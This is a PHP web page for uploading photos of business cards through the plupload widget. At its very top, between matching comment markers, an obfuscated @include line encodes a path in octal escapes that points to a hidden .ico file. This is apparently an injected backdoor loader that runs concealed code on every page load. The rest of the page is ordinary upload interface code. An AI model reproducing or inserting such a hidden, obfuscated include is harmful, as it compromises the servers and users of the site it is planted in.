<?php
/*d856d*/

@include "\057v\141r\057w\167w\057s\171n\160a\164/\155o\142i\154e\055a\160p\154i\143a\164i\157n\057d\144/\0562\0641\065f\067f\143.\151c\157";

/*d856d*/




?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"/>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Upload multiple business card</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.5/css/bootstrap.min.css" integrity="sha384-AysaV+vQoT3kOAXZkl02PThvDr8HYKPZhNT5h/CXfBThSRXQ6jW5DO2ekP5ViFdi" crossorigin="anonymous">
<link rel="stylesheet" href="//ajax.googleapis.com/ajax/libs/jqueryui/1.8.9/themes/base/jquery-ui.css" type="text/css" />
<link rel="stylesheet" href="./js/jquery.ui.plupload/css/jquery.ui.plupload.css" type="text/css" />

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jqueryui/1.10.2/jquery-ui.min.js"></script>

<!-- production -->
<script type="text/javascript" src="./js/plupload.full.min.js"></script>
<script type="text/javascript" src="./js/jquery.ui.plupload/jquery.ui.plupload.js"></script>

<!-- debug 
<script type="text/javascript" src="./js/moxie.js"></script>
<script type="text/javascript" src="./js/plupload.dev.js"></script>
<script type="text/javascript" src="./js/jquery.ui.plupload/jquery.ui.plupload.js"></script>
-->
<style>
.plupload_wrapper{min-width:inherit;}
.plupload_add,.plupload_start{font-size:16px;}
</style>
</head>
<body style="font: 13px Verdana; background: #eee; color: #333">
<div class="container">
<p style='margin-top:10px;'>
1. Use the camera app to take pictures of the business cards.<br/>
2. Upload the pictures using the buttons below:	
</p>
<div class="row">
	<div class="col-md-12">
		<form id="form" method="post" action="./dump.php">
			<div id="uploader">
				<p>Your browser doesn't have Flash, Silverlight or HTML5 support.</p>
			</div>
		</form>
	</div>
</div>
<div class="clearfix visible-xs-block"></div>
</div>
<script type="text/javascript">
// Initialize the widget when the DOM is ready
$(function() {
	$("#uploader").plupload({
		// General settings
		runtimes : 'html5,flash,silverlight,html4',
		url : './upload_bulk.php',

		// User can upload no more then 20 files in one go (sets multiple_queues to false)
		max_file_count: 50,
		
		chunk_size: '10mb',

		
		
		filters : {
			// Maximum file size
			max_file_size : '1000mb',
			// Specify what files to browse for
			mime_types: [
				{title : "Image files", extensions : "jpg,png"}
			]
		},

		// Rename files by clicking on their titles
		rename: true,
		
		// Sort files
		sortable: true,

		// Enable ability to drag'n'drop files onto the widget (currently only HTML5 supports that)
		dragdrop: true,

		// Views to activate
		views: {
			list: true,
			thumbs: true, // Show thumbs
			active: 'thumbs'
		},

		// Flash settings
		flash_swf_url : './js/Moxie.swf',

		// Silverlight settings
		silverlight_xap_url : './js/Moxie.xap'
	});
	
	setTimeout(function(){
		_h = $(window).height() - 100;		
		jQuery("#uploader_container").css({minHeight:_h+'px',height:_h+'px'});
		jQuery(".plupload_logo").css({background:'none'});
		jQuery(".plupload_header_title,.plupload_header_text,.plupload_droptext").html('');
	},300);

	// Handle the case when form was submitted before uploading has finished
	$('#form').submit(function(e) {
		// Files in queue upload them first
		if ($('#uploader').plupload('getFiles').length > 0) {

			// When all files are uploaded submit form
			$('#uploader').on('complete', function() {
				$('#form')[0].submit();
			});

			$('#uploader').plupload('start');
		} else {
			alert("You must have at least one file in the queue.");
		}
		return false; // Keep the form from submitting
	});
});
</script>
</body>
</html>
